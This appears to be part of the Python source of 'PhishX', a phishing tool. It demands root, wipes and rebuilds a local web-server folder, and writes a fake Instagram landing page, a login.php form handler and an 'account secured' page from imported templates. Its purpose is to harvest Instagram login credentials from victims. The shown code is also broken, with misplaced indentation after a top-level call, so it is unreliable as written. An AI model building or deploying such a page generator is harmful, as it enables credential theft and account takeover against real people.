
#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
###############################################
#        PhishX Needs Root Privileges         #
###############################################

if os.geteuid() != 0:
	exit("You need to have root privileges to run PhishX")

###############################################

import codecs
import time
import subprocess
import sys
import random
import datetime
import requests

##########################################

from data.instagram import *

########################################

os.system("rm -r WEBSERVER/")

	subprocess.call(['mkdir','-p','WEBSERVER/'])

	filedata = str(Main_Instagram)
	
	with open('./WEBSERVER/index.html', 'w') as file:
		file.write(filedata)
	file.close()

	logindata = str(Login_Instagram)
	with open('./WEBSERVER/login.php', 'w') as file:
		file.write(logindata)
	file.close()

	secured_html = str(Secured_Instagram)
	with open('./WEBSERVER/account_secured.html', 'w') as file:
		file.write(secured_html)
	file.close()
